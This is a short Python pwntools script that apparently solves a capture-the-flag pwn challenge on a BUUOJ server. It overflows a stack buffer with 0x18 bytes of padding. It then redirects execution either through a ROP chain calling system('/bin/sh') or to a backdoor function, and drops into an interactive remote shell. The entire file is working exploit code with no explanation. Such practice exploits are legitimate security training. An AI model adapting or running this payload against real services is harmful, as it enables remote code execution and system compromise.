from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

p = remote("node3.buuoj.cn", 29283)

pop_rdi = 0x400833
binsh = 0x400858
system_plt = 0x400590

# method 1
# payload = b'a'*(0x10+8) + p64(pop_rdi) + p64(binsh) + p64(system_plt)

# method 2
backdoor = 0x4006ea
payload = b'a'*(0x10+8) + p64(backdoor)

p.sendlineafter("name:\n", b'100')

p.sendlineafter("name?\n", payload)

p.interactive()